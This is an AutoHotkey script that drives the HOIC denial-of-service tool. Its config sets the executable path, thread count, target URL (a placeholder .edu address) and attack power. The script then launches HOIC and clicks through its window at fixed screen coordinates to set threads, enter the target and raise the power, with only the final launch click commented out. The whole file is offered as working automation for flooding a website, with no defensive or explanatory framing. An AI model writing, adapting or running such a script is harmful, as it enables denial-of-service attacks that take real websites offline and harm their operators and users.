#CommentFlag //

// ------------------------------------------------
// CONFIG
// ------------------------------------------------

hoic_path = C:\Temp\Hoic\hoic.exe
threads_added = 4 // base threads = 2
target_url = http://www.example.edu
attack_power = 1 // 0 = Low, 1 = Medium, 2 = High

// ------------------------------------------------
// MAIN SCRIPT
// ------------------------------------------------

// Execute HOIC
Run, %hoic_path%

// Give focus to HOIC window
WinActivate, H.O.I.C.
WinWaitActive, H.O.I.C.

// Threads
MouseMove, 643, 339
Loop %threads_added% {
	Click
}

// Add target
MouseMove, 829, 341
Click
SendInput %target_url%
MouseMove, 29, 132
Click
Loop %attack_power% {
	Send {Right}
}
Send {TAB}
Send {TAB}
Send {TAB}
Send {Enter}

// Execute attack
//MouseMove, 439, 338
// Click